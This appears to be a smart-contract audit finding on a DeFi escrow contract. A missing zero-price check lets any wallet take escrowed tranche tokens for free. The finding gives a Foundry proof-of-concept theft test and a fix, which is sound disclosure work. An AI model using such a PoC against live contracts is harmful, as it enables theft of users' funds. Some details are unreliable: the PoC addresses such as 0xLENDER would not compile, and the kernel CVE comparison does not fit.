### Title
Missing zero-check on `underlyingsRequested` lets anyone seize escrowed tranche tokens for free - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest()` validates that the deposited tranche amount is non-zero but never validates `underlyingsRequested`. A request created with `underlyingsRequested == 0` is immediately fulfillable by any wallet paying **zero** underlying tokens, because `fullfillWriteOffRequest()` only requires `_underlyings >= currentRequest.underlyings` (i.e. `>= 0`). The fulfiller receives the full escrowed tranche balance while the lender receives nothing — the same "zero count input crashes/compromises the system" class as CVE-2024-56716, where an unvalidated zero parameter broke `nsim_dev_health_break_write()`.

### Finding Description
In `createWriteOffRequest` the only input check is:

```solidity
if (amount == 0) revert NotAllowed();   // line 90
```

There is no `underlyingsRequested == 0` check, so a lender can create a request with `tranches = X`, `underlyings = 0`, and `pendingUnderlyings` is not even increased.

In `fullfillWriteOffRequest` (line 123) the fulfillment check is:

```solidity
if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
  revert WrongRequest();
}
```

With `currentRequest.underlyings == 0`, `_underlyings = 0` passes. Execution then:
- `underlyingToken.safeTransferFrom(msg.sender, address(this), 0)` — no-op
- `_totFee = 0`, `safeTransfer(feeReceiver, 0)` — no-op
- `safeTransfer(_user, 0)` — lender gets nothing
- `IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches)` — fulfiller takes all escrowed tranche tokens for free (line 151)

No other guard helps: `nonReentrant` doesn't matter, `deleteWriteOffRequest` only works before a fulfillment, and there is no oracle/minimum-price check. Note the escrow is `nonReentrant` and fulfilment is permissionless ("this function can be called by any wallet"), so an attacker monitoring `createWriteOffRequest` can even front-run/back-run within the same block — a lender who bundles create + later correct request, or who fat-fingers the parameter, loses the tranches atomically.

### Impact Explanation
Direct theft of escrowed tranche tokens. The attacker obtains `currentRequest.tranches` (arbitrary size — could be the entire escrowed position) at zero cost, bypassing the `writeOffDeposit` economics entirely: tranche tokens that were meant to be bought for underlying are simply taken. Loss = 100% of the escrowed tranches on any zero-priced request.

### Likelihood Explanation
Requires a lender to submit `underlyingsRequested = 0` (input error, misconfigured integration, or a request created only to park tranches — a plausible pattern since deleting later returns them). Once such a request exists, any unprivileged EOA can fulfill it in the same or a later block while the epoch is running (the request persists across the running epoch until claimed). Given that fulfillment is permissionless and MEV bots scan for zero-priced orders, realization probability is high once the precondition occurs — consistent with a Medium-severity input-validation flaw rather than a critical one.

### Recommendation
Add a zero check in `createWriteOffRequest`:

```solidity
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

Optionally also enforce `_underlyings > 0` (or `currentRequest.underlyings != 0`) inside `fullfillWriteOffRequest` as defense-in-depth, mirroring the kernel fix that rejects a zero count up front.

### Proof of Concept
Foundry fork-style PoC (setup assumes an initialized `IdleCreditVaultWriteOffEscrow` for a running-epoch credit vault, lender holds AA tranche tokens, attacker is any EOA):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultWriteOffEscrow} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract ZeroPriceWriteOffTheft is Test {
    IdleCreditVaultWriteOffEscrow escrow;
    IERC20Detailed tranche;   // e.g. AA tranche
    IERC20Detailed underlying;

    address lender   = address(0xLENDER);
    address attacker = address(0xATTACKER);

    function testStealEscrowedTranchesForFree() public {
        uint256 trancheAmt = 100e18;

        // --- Lender (victim): creates request with underlyingsRequested == 0 ---
        vm.startPrank(lender);
        tranche.approve(address(escrow), trancheAmt);
        // no revert: only `amount == 0` is checked
        escrow.createWriteOffRequest(trancheAmt, 0);
        vm.stopPrank();

        assertEq(tranche.balanceOf(address(escrow)), trancheAmt);

        // --- Attacker: fulfills the zero-priced request paying nothing ---
        vm.prank(attacker);
        escrow.fullfillWriteOffRequest(lender, trancheAmt, 0);

        // Attacker took all escrowed tranches, paid 0 underlying
        assertEq(tranche.balanceOf(attacker), trancheAmt);
        assertEq(underlying.balanceOf(lender), 0); // lender received nothing
        assertEq(tranche.balanceOf(address(escrow)), 0);
    }
}
```

Expected result: the fulfill call succeeds (no `WrongRequest` revert because `0 < 0` is false), the attacker receives `trancheAmt` tranche tokens, and the lender's request is deleted with zero compensation.
